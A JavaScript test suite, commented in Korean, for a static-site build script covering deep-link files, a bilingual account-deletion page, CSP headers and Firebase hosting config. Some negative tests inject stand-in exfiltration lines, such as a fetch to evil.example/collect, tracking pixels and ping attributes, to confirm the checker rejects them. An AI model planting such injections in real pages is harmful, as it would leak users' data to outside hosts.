// 정적 빌드 검사(B0). 값이 비거나 자리표시자면 배포가 실패하는지, 만들어진 파일이 정본과 맞는지, 링크 코드가 새지 않는지.
import { createHash } from 'node:crypto';
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { build, BuildError, check, CK_VERSION, LIVE_GZIP_BUDGET, readFirebaseJson, readInjected, ROOT } from '../scripts/build.mjs';

const FP1 = Array.from({ length: 32 }, (_, i) => (i * 7 + 16).toString(16).toUpperCase().padStart(2, '0')).join(':');
const FP2 = Array.from({ length: 32 }, (_, i) => (255 - i * 3).toString(16).toUpperCase().padStart(2, '0')).join(':');
const API = 'https://mong-api-abc123-du.a.run.app';
const ENV = { APPLE_TEAM_ID: 'A1B2C3D4E5', ANDROID_CERT_SHA256: `${FP1}, ${FP2.toLowerCase()}`, APP_STORE_ID: '6739012345', API_ORIGIN: API };

const dirs = [];
function tmp() {
  const d = mkdtempSync(join(tmpdir(), 'web-static-'));
  dirs.push(d);
  return d;
}
/** src를 임시 폴더로 복사(고장 낸 사본으로 시험) */
function srcCopy() {
  const d = tmp();
  cpSync(join(ROOT, 'src'), d, { recursive: true });
  return d;
}
afterEach(() => {
  // 빌드마다 CanvasKit(약 7MB)이 복사된다 — 임시 폴더를 남기지 않는다
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function fails(env, srcDir = join(ROOT, 'src')) {
  const outDir = tmp() + '/out';
  try {
    build({ env, srcDir, outDir });
  } catch (e) {
    expect(e).toBeInstanceOf(BuildError);
    expect(existsSync(outDir)).toBe(false); // 반쯤 만든 폴더를 남기지 않는다
    return e.problems.join('\n');
  }
  throw new Error('빌드가 통과했다');
}

describe('주입 값이 없으면 배포 실패', () => {
  it('셋 다 비면 셋 다 이름으로 알린다(값은 싣지 않음)', () => {
    const msg = fails({});
    expect(msg).toMatch(/APPLE_TEAM_ID가 비어/);
    expect(msg).toMatch(/ANDROID_CERT_SHA256이 비어/);
    expect(msg).toMatch(/APP_STORE_ID가 비어/);
  });
  it('자리표시자 같은 값(0000…·XXXXXXXXXX·형식 틀림)도 실패', () => {
    const zero = Array(32).fill('00').join(':');
    expect(fails({ ...ENV, APPLE_TEAM_ID: 'XXXXXXXXXX' })).toMatch(/APPLE_TEAM_ID 형식/);
    expect(fails({ ...ENV, APPLE_TEAM_ID: 'abc' })).toMatch(/APPLE_TEAM_ID 형식/);
    expect(fails({ ...ENV, ANDROID_CERT_SHA256: zero })).toMatch(/1번째 값이 SHA-256/);
    expect(fails({ ...ENV, ANDROID_CERT_SHA256: 'AB:CD' })).toMatch(/SHA-256 지문 형식/);
    expect(fails({ ...ENV, ANDROID_CERT_SHA256: `${FP1},${FP1}` })).toMatch(/같은 지문/);
    expect(fails({ ...ENV, APP_STORE_ID: '000000' })).toMatch(/APP_STORE_ID 형식/);
    expect(fails({ ...ENV, APPLE_TEAM_ID: 'ABCDEFGHIJ' })).toMatch(/APPLE_TEAM_ID 형식/); // 연속값
    expect(fails({ ...ENV, APP_STORE_ID: '1234567890' })).toMatch(/APP_STORE_ID 형식/);
    expect(fails({ ...ENV, ANDROID_CERT_SHA256: Array(32).fill('AB').join(':') })).toMatch(/SHA-256 지문 형식/); // 두 글자 반복
  });
  it('오류 문구에 값이 실리지 않는다', () => {
    const msg = fails({ ...ENV, APPLE_TEAM_ID: 'secretTEAM' });
    expect(msg).not.toContain('secretTEAM');
    expect(readInjected(ENV).problems).toEqual([]);
  });
});

describe('정상 빌드', () => {
  const out = () => {
    const o = tmp() + '/out';
    const r = build({ env: ENV, outDir: o });
    return { o, r, read: (p) => readFileSync(join(o, p), 'utf8') };
  };

  it('AASA·assetlinks가 app.json의 번들 id·패키지와 주입 값으로 채워진다', () => {
    const { read } = out();
    const app = JSON.parse(readFileSync(join(ROOT, '../mobile/app.json'), 'utf8')).expo;
    const aasa = JSON.parse(read('.well-known/apple-app-site-association'));
    expect(aasa.applinks.details[0].appIDs).toEqual([`A1B2C3D4E5.${app.ios.bundleIdentifier}`]);
    expect(aasa.applinks.details[0].components.map((c) => c['/'])).toEqual(['/m/*']);
    const al = JSON.parse(read('.well-known/assetlinks.json'));
    expect(al[0].target.package_name).toBe(app.android.package);
    expect(al[0].target.sha256_cert_fingerprints).toEqual([FP1, FP2]);
  });

  it('파일 목록: 딥링크 둘·config·content·/delete·랜딩·robots (src/.gitkeep 제외, /m은 Cloud Run이라 정적 파일 없음)', () => {
    const { r } = out();
    expect(r.files).toEqual([
      '.well-known/apple-app-site-association',
      '.well-known/assetlinks.json',
      'config/v1.json',
      'content/v1.json',
      'delete/index.html',
      'index.html',
      'robots.txt',
    ]);
  });

  it('/w 웹 뷰어(B3): manifest → live.<내용 해시>.js + CanvasKit, live.js gzip 예산 안, 금지 API 없음, 정적 /m 없음', () => {
    const { o, r, read } = out();
    const mf = JSON.parse(read('w/manifest.json'));
    expect(mf).toEqual({ live: r.live.live, ck: `/w/ck/${CK_VERSION}/` });
    const js = readFileSync(join(o, mf.live.slice(1)));
    expect(mf.live).toBe(`/w/live.${createHash('sha256').update(js).digest('hex').slice(0, 10)}.js`);
    expect(existsSync(join(o, `w/ck/${CK_VERSION}/canvaskit.wasm`))).toBe(true);
    expect(r.live.liveGzip).toBeLessThanOrEqual(LIVE_GZIP_BUDGET);
    expect(js.toString()).not.toMatch(/innerHTML|sendBeacon|localStorage/);
    expect(existsSync(join(o, 'm'))).toBe(false);
  });

  it('/delete 페이지(B2): 한·영, 코드+글귀 폼, 글귀는 API_ORIGIN의 삭제 API로만, CSP connect-src = 그 출처 하나, 처리방침 링크', () => {
    const { read } = out();
    const html = read('delete/index.html');
    expect(html).toContain('<section lang="ko">');
    expect(html).toContain('<section lang="en">');
    expect(html).toMatch(/<input name="code"/);
    expect(html).toMatch(/<input name="phrase"/);
    expect(html).toContain('href="/privacy"');
    expect(html).toContain(`fetch('${API}/api/v1/deletion/web'`);
    expect(html).toContain(`connect-src ${API};`);
    expect(html).toContain("form-action 'none'");
    expect(html).toContain("credentials:'omit'");
    expect(html).not.toMatch(/innerHTML|<script[^>]+src=|localStorage|document\.cookie/);
    expect(html).toMatch(/이메일로 보내지 마세요/); // 처리방침 12절 '글귀를 이메일에 적지 마세요'와 같은 약속
    const script = /<script>([\s\S]*?)<\/script>/.exec(html)[1];
    expect(html).toContain(`script-src 'sha256-${createHash('sha256').update(script).digest('base64')}'`);
    // 랜딩은 여전히 어떤 통신도 못 한다(/m은 B3부터 Cloud Run — 서버 시험 m-html.test.ts)
    const m = read('index.html');
    expect(m).not.toMatch(/fetch\(/);
    expect(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(m)[1]).not.toContain('connect-src');
  });
  it('API_ORIGIN이 비었거나 https가 아니면 배포 실패', () => {
    expect(fails({ ...ENV, API_ORIGIN: '' })).toMatch(/API_ORIGIN이 비어/);
    expect(fails({ ...ENV, API_ORIGIN: 'http://mong-api.run.app' })).toMatch(/API_ORIGIN은 https/);
  });

  it('config/v1.json: 서버 기능 스위치는 모두 꺼짐(배포 전), 게임 플래그는 빠짐(= 번들 기본값)', () => {
    const { read } = out();
    const c = JSON.parse(read('config/v1.json'));
    expect(c.flags).toEqual({ cloud: false, link: false, remoteMotifs: false, webLive: false });
    expect(c.ttlSec).toBeLessThanOrEqual(3600);
  });
});

describe('그럴듯한 오답 — 검사가 잡아야 하는 고장', () => {
  it('config 플래그 오타', () => {
    const d = srcCopy();
    const p = join(d, 'config/v1.json');
    writeFileSync(p, readFileSync(p, 'utf8').replace('"webLive"', '"webLiev"'));
    expect(fails(ENV, d)).toMatch(/config\/v1\.json 스키마/);
  });
  it('매니페스트가 없는 파일·틀린 해시·스키마 1 위반 모티프를 가리킴', () => {
    const d = srcCopy();
    const motif = {
      schema: 1,
      id: 'w2027-06-crane',
      zone: 'far-alone',
      family: 'crane',
      paths: [{ d: 'M12 40 C 20 10, 40 10, 50 40', w: 1.4, layer: 'ink' }],
      shader: { bleed: 0.35, grain: 0.2, tone: 'night' },
      text: { ko: { title: '학 한 마리', line: '간밤 꿈에 학 한 마리가 물가에 섰어요!', scene: '먼 물가에 학 한 마리가 서 있어요' } },
    };
    const buf = Buffer.from(JSON.stringify(motif));
    const sha = createHash('sha256').update(buf).digest('hex');
    const name = `w2027-06-crane.${sha.slice(0, 8)}.json`;
    writeFileSync(join(d, 'content/motifs', name), buf);
    const entry = { id: 'w2027-06-crane', kind: 'weekly', from: '2027-02-08', schema: 1, minAppBuild: 14, url: `/content/motifs/${name}`, sha256: sha, bytes: buf.length };
    writeFileSync(join(d, 'content/v1.json'), JSON.stringify({ v: 1, seq: 1, motifs: [entry], revoked: [] }));
    expect(fails(ENV, d)).toMatch(/모티프 스키마 1 — text\.ko\.line 금지 표현/); // 느낌표
    writeFileSync(join(d, 'content/v1.json'), JSON.stringify({ v: 1, seq: 1, motifs: [{ ...entry, sha256: 'b'.repeat(64) }], revoked: [] }));
    expect(fails(ENV, d)).toMatch(/sha256이 다르다/);
    writeFileSync(join(d, 'content/v1.json'), JSON.stringify({ v: 1, seq: 1, motifs: [{ ...entry, url: '/content/motifs/w2027-06-crane.00000000.json' }], revoked: [] }));
    expect(fails(ENV, d)).toMatch(/파일 .* 없다/);
  });
  it('랜딩 페이지에 분석 스크립트·비콘·외부 주소가 들어오면 실패', () => {
    for (const inject of ['<script src="https://www.googletagmanager.com/gtag/js"></script>', '<img src="https://tracker.example/p.gif">', '<!-- navigator.sendBeacon -->']) {
      const d = srcCopy();
      const p = join(d, 'index.html');
      writeFileSync(p, readFileSync(p, 'utf8').replace('</main>', `${inject}</main>`));
      expect(fails(ENV, d), inject).toMatch(/외부 스크립트|분석|허용 밖 외부 주소/);
    }
  });
  it('새 {{자리}}를 만들고 값을 안 넣으면 실패', () => {
    const d = srcCopy();
    const p = join(d, 'index.html');
    writeFileSync(p, readFileSync(p, 'utf8').replace('</main>', '{{NEW_SECRET}}</main>'));
    expect(fails(ENV, d)).toMatch(/채워지지 않은/);
  });
});

// 리뷰 m3: 검사를 **check() 직접 호출**로 시험한다(src 템플릿이 아니라 만들어진 public/을 고장 내 본다)
describe('check() — 만들어진 산출물을 고장 내면 잡는다', () => {
  function built() {
    const o = tmp() + '/out';
    build({ env: ENV, outDir: o });
    const app = JSON.parse(readFileSync(join(ROOT, '../mobile/app.json'), 'utf8')).expo;
    const v = { team: 'A1B2C3D4E5', origin: 'https://mongmang.ink', apiOrigin: API, iosBundle: app.ios.bundleIdentifier, androidPackage: app.android.package, firebaseJson: readFirebaseJson(join(ROOT, 'firebase.json')) };
    return { o, v };
  }
  const breaks = (o, v, rel, from, to) => {
    const p = join(o, rel);
    writeFileSync(p, readFileSync(p, 'utf8').replace(from, to));
    try {
      check(o, v);
    } catch (e) {
      return e.problems.join('\n');
    }
    throw new Error('검사가 통과했다');
  };

  it('정상 산출물은 통과', () => {
    const { o, v } = built();
    expect(() => check(o, v)).not.toThrow();
  });
  it('referrer no-referrer를 빼면 실패', () => {
    const { o, v } = built();
    expect(breaks(o, v, 'index.html', '<meta name="referrer" content="no-referrer">', '')).toMatch(/referrer/);
  });
  it('CSP meta를 빼거나 default-src를 풀면 실패', () => {
    const { o, v } = built();
    expect(breaks(o, v, 'index.html', "default-src 'none'", "default-src *")).toMatch(/CSP/);
  });
  it('ping= 속성·작은따옴표·프로토콜 상대 주소로 우회해도 실패', () => {
    for (const inject of [' ping="https://evil.example/p"', " data-x='https://evil.example/x'", ' srcset="//evil.example/a.png 1x"']) {
      const { o, v } = built();
      expect(breaks(o, v, 'index.html', '</main>', `<a${inject}></a></main>`), inject).toMatch(/분석|허용 밖 외부 주소/);
    }
  });
  it('/delete: connect-src를 넓히거나, 다른 곳으로 fetch하거나, innerHTML을 쓰거나, 처리방침 링크를 빼면 실패', () => {
    for (const [from, to, re] of [
      [`connect-src ${API};`, 'connect-src *;', /connect-src/],
      [`fetch('${API}/api/v1/deletion/web'`, "fetch('https://evil.example/collect'", /fetch가 삭제 API 밖/],
      ['o.textContent=t.busy', 'o.innerHTML=t.busy', /분석·통신/],
      [/href="\/privacy"/g, 'href="/about"', /처리방침/],
    ]) {
      const { o, v } = built();
      expect(breaks(o, v, 'delete/index.html', from, to), String(to)).toMatch(re);
    }
  });
  it('랜딩에 fetch를 넣으면 여전히 실패(예외는 /delete 하나)', () => {
    const { o, v } = built();
    expect(breaks(o, v, 'index.html', '</main>', "<script>fetch('/x')</script></main>")).toMatch(/분석·통신/);
  });
  it('robots.txt가 /m/를 막으면 실패(I6)', () => {
    const { o, v } = built();
    expect(breaks(o, v, 'robots.txt', 'Disallow: /config/', 'Disallow: /m/\nDisallow: /config/')).toMatch(/robots\.txt가 \/m\//);
  });
  it('정적 /m 파일이 다시 생기면 실패(B3: /m/**는 Cloud Run이 답한다)', () => {
    const { o, v } = built();
    mkdirSync(join(o, 'm'));
    writeFileSync(join(o, 'm/index.html'), '<!doctype html>');
    expect(() => check(o, v)).toThrow(/정적 \/m 파일/);
  });
  it('firebase.json: /m/** rewrite가 Cloud Run이 아니거나, /m/*에 Cache-Control을 두거나(서버 헤더를 덮음), /m/** 헤더가 seen·get까지 덮으면 실패', () => {
    const { o, v } = built();
    const fb = structuredClone(v.firebaseJson);
    fb.hosting.rewrites[0] = { source: '/m/**', destination: '/m/index.html' };
    expect(() => check(o, { ...v, firebaseJson: fb })).toThrow(/Cloud Run/);
    const fb2 = structuredClone(v.firebaseJson);
    fb2.hosting.headers = fb2.hosting.headers.map((h) =>
      h.source === '/m/*' ? { ...h, headers: [...h.headers, { key: 'Cache-Control', value: 'public, max-age=60, s-maxage=300' }] } : h,
    );
    expect(() => check(o, { ...v, firebaseJson: fb2 })).toThrow(/Cache-Control을 두지 않는다/);
    const fb3 = structuredClone(v.firebaseJson);
    fb3.hosting.headers.push({ source: '/m/**', headers: [] });
    expect(() => check(o, { ...v, firebaseJson: fb3 })).toThrow(/seen/);
  });
  it('firebase.json: /m/* X-Robots-Tag가 없거나 ignore가 점 파일을 빼면 실패', () => {
    const { o, v } = built();
    const fb = structuredClone(v.firebaseJson);
    fb.hosting.headers = fb.hosting.headers.map((h) => (h.source === '/m/*' ? { ...h, headers: h.headers.filter((x) => x.key !== 'X-Robots-Tag') } : h));
    expect(() => check(o, { ...v, firebaseJson: fb })).toThrow(/X-Robots-Tag/);
    const fb2 = structuredClone(v.firebaseJson);
    fb2.hosting.ignore = ['firebase.json', '**/.*'];
    expect(() => check(o, { ...v, firebaseJson: fb2 })).toThrow(/ignore/);
  });
  it('실제 firebase.json: /m/*에 X-Robots-Tag noindex·Cache-Control 없음(서버가 정함), /m/**는 Cloud Run, ignore에 점 파일 패턴 없음, robots.txt는 /m을 막지 않음', () => {
    const fb = readFirebaseJson(join(ROOT, 'firebase.json')).hosting;
    expect(fb.headers.find((h) => h.source === '/m/*').headers).toContainEqual({ key: 'X-Robots-Tag', value: 'noindex' });
    expect(fb.headers.find((h) => h.source === '/m/*').headers.map((h) => h.key)).toEqual(['X-Robots-Tag', 'X-Frame-Options']);
    expect(fb.rewrites[0]).toEqual({ source: '/m/**', run: { serviceId: 'mong-api', region: 'asia-northeast3' } });
    expect(fb.ignore).toEqual(['**/.DS_Store']);
    expect(readFileSync(join(ROOT, 'src/robots.txt'), 'utf8')).not.toMatch(/^Disallow:\s*\/m/m);
  });
});
